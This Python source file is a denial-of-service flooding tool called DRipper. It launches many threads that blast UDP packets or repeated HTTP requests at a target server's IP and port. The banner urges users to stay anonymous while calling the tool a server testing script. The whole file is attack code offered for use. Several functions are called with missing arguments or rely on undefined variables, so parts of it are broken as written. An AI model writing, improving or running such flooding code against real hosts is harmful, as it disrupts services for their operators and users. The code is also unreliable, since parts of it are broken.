import random
import socket
import string
import signal
import sys
import threading
import time
import urllib.request
from dataclasses import dataclass
from optparse import OptionParser

USAGE = 'Usage: python %prog [options] arg'
EPILOG = 'Example: python DRipper.py -s 192.168.0.1 -p 80 -t 100'


@dataclass
class Context:
    """Class for passing a context to a parallel processes."""
    host: str = ''
    port: int = 80
    threads: int = 100

    user_agents: list[str] = ''
    headers = ''


def init_context(_ctx, args):
    """Initialize Context from Input args."""
    _ctx.host = args[0].host
    _ctx.port = args[0].port
    _ctx.threads = args[0].threads
    _ctx.user_agents = user_agent()
    _ctx.headers = headers()


def user_agent():
    """Read User-Agent string from file."""
    uagents = open("useragents.txt", "r")
    uagent = uagents.readlines()
    uagents.close()

    return uagent


def headers():
    """Reading headers from file."""
    headers = open("headers.txt", "r")
    data = headers.read()
    headers.close()

    return data


def set_headers_dict():
    # reading headers
    global headers_dict
    headers = open("headers.txt", "r")
    content = headers.readlines()
    headers_dict = {}
    for item in content:
        parts = item.split(':')
        headers_dict[parts[0]] = parts[1].strip()
    headers.close()


def get_random_string(len_from, len_to):
    """Random string with different length"""
    length = random.randint(len_from, len_to)
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))

    return result_str


def get_random_port():
    ports = [22, 53, 80, 443]
    return random.choice(ports)


def down_it_udp():
    i = 1
    while True:
        if random_packet_len:
            extra_data = get_random_string(0, 50000)
        else:
            extra_data = ''
        packet = str(
            "GET / HTTP/1.1\nHost: " + host
            + "\n\n User-Agent: "
            + random.choice(uagent)
            + "\n" + data
            + "\n\n" + extra_data).encode('utf-8')
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        p = int(port) if port else get_random_port()
        try:
            s.sendto(packet, (host, p))
        except socket.gaierror:
            print("\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m")
        else:
            print('\033[92m Packet was sent \033[0;0m')
        s.close()

        if port:
            i += 1
            if i == 50:
                i = 1
                thread = threading.Thread(target=connect_host)
                thread.daemon = True
                thread.start()
        time.sleep(.01)


def down_it_http():
    while True:
        protocol = 'http://'
        if port == 443:
            protocol = 'https://'

        url = f"{protocol}{host}:{port}"
        http_headers = headers_dict
        http_headers['User-Agent'] = random.choice(uagent).strip()

        try:
            urllib.request.urlopen(
                urllib.request.Request(url, headers=http_headers)
            )
        except:
            print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
                  " Program will continue working.\033[0m")
        else:
            print('\033[92m HTTP-Request was done \033[0;0m')

        time.sleep(.01)


def logo():
    print(''' \033[0;95m

██████╗ ██████╗ ██╗██████╗ ██████╗ ███████╗██████╗
██╔══██╗██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║  ██║██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
██║  ██║██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║██║     ██║     ███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝

It is the end user's responsibility to obey all applicable laws.
It is just like a server testing script and Your IP is visible. Please, make sure you are anonymous!
    \033[0m ''')


def usage(parser):
    """Wrapper for Logo with help."""
    logo()
    parser.print_help()
    sys.exit()


def parse_args(parser):
    """Initialize command line arguments parser and parse CLI arguments."""
    parser_add_options(parser)

    return parser.parse_args()


def parser_add_options(parser):
    """Add options to a parser."""
    parser.add_option('-p', '--port',
                      dest='port', type='int', default=80,
                      help='port (default: 80)')
    parser.add_option('-t', '--threads',
                      dest='threads', type='int', default=100,
                      help='threads (default: 100)')
    parser.add_option('-r', '--random_len',
                      dest='random_packet__len', type='int',
                      help='Send random packets with random length')
    parser.add_option('-m', '--method',
                      dest='attack_method', type='str', default='udp',
                      help='Attack method: UDP (default), HTTP')
    parser.add_option('-s', '--server',
                      dest='host',
                      help='Attack to server IP')


def get_parameters():
    global host
    global port
    global thr
    global item
    global random_packet_len
    global attack_method
    global headers_dict
    optp = OptionParser(add_help_option=False, epilog="Rippers")
    optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--threads", type="int", dest="threads", help="default 100")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    optp.add_option("-r", "--random_len", type="int", dest="random_packet_len",
                    help="Send random packets with random length")
    optp.add_option("-m", "--method", type="str", dest="attack_method",
                    help="Attack method: udp (default), http")
    opts, args = optp.parse_args()
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = None
    else:
        port = opts.port

    if opts.threads is None:
        thr = 100
    else:
        thr = opts.threads

    if opts.random_packet_len:
        random_packet_len = True
    else:
        random_packet_len = False

    if opts.attack_method and opts.attack_method in ['udp', 'http']:
        attack_method = opts.attack_method
    else:
        attack_method = 'udp'


def check_host(host):
    """Check Server IP."""
    error_msg = "\033[91mCheck server IP and port! Wrong format of server name or no connection.\033[0m"
    if not host:
        print(error_msg)
        exit(1)

    try:
        socket.gethostbyname(host)
    except:
        print(error_msg)
        exit(1)


def connect_host(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, int(port)))
    except:
        print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
              " Program will continue send UDP-packets to the destination.\033[0m")


def main():
    """The main function to run the script from the command line."""
    parser = OptionParser(usage=USAGE, epilog=EPILOG)
    args = parse_args(parser)

    if len(sys.argv) < 2:
        usage()
    get_parameters()

    if not check_host():
        print("\033[91mCheck server ip and port! Wrong format of server name or no connection.\033[0m")
        exit()

    if port:
        connect_host()

    p = str(port) if port else '(22, 53, 80, 443)'
    print("\033[92m", host, " port: ", p, " threads: ", str(thr), "\033[0m")
    print("\033[94mPlease wait...\033[0m")
    user_agent()
    headers()
    time.sleep(5)

    thrs = []
    for i in range(int(thr)):
        if attack_method == 'udp':
            thrs.append(threading.Thread(target=down_it_udp))
        elif attack_method == 'http':
            set_headers_dict()
            thrs.append(threading.Thread(target=down_it_http))
        thrs[i].daemon = True  # if thread is exist, it dies
        thrs[i].start()

    while True:
        time.sleep(.1)


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:  # The user hit Control-C
        sys.stderr.write('\n\nReceived keyboard interrupt, terminating.\n\n')
        sys.stderr.flush()
        # Control-C is fatal error signal 2, for more see
        # https://tldp.org/LDP/abs/html/exitcodes.html
        sys.exit(128 + signal.SIGINT)
    except RuntimeError as exc:
        sys.stderr.write(f'\n{exc}\n\n')
        sys.stderr.flush()
        sys.exit(1)
